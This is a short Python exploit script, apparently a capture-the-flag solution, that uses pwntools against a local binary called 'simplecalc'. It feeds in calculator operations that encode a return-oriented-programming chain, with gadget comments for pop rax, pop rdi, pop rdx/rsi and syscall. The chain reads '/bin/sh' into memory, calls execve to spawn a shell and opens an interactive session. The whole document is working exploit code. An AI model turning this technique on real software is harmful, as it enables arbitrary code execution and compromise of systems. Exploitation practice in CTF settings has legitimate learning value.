from pwn import *
payload=b"123\n"
payload+=b"2\n926200088\n926200088\n2\n3422615\n3422615\n"#/bin/sh
payload+=(b"2\n256\n257\n")*10+b"2\n3556840\n3556840\n2\n3556840\n3556840\n"+(b"2\n256\n257\n")*4#junk
payload+=b"1\n2256282\n2256282\n2\n2256282\n2256282\n" #pop rax;ret;
payload+=(b"2\n2256282\n2256282\n")*2 #rax=0;
payload+=b"1\n2100665\n2100666\n2\n2100665\n2100665\n" #pop rdi;ret
payload+=b"2\n3556840\n3556840\n2\n3556840\n3556840\n" #rdi=0
payload+=b"1\n2211156\n2211157\n2\n2211156\n2211156\n" #pop rdx;pop rsi;ret;
payload+=b"2\n2211155\n2211148\n2\n2211155\n2211155\n" #rdx=7
payload+=b"1\n3539200\n3539200\n2\n3556840\n3556840\n" #rsi=0x6c0200
payload+=b"1\n2303090\n2303091\n2\n2303090\n2303090\n" #syscall;ret;
#read /bin/sh to fixed place
payload+=b"1\n2100665\n2100666\n2\n2100665\n2100665\n" #pop rdi ;ret
payload+=b"1\n3539200\n3539200\n2\n3556840\n3556840\n" #/bin/sh to rdi
payload+=b"1\n2256282\n2256282\n2\n2256282\n2256282\n" #pop rax;ret
payload+=b"2\n2256282\n2256223\n2\n2256282\n2256282\n" #rax=59
payload+=b"1\n2211156\n2211157\n2\n2211156\n2211156\n" #pop rdx;pop rsi;ret;
payload+=b"2\n3556840\n3556840\n2\n3556840\n3556840\n" #rdx=0
payload+=b"2\n3556840\n3556840\n2\n3556840\n3556840\n" #rsi=0
payload+=b"1\n2303090\n2303091\n2\n2303090\n2303090\n" #syscall;ret
#execve syscall
payload+=b"5\n"+b"/bin/sh"
p=process('./simplecalc')
p.sendline(payload)
p.interactive()
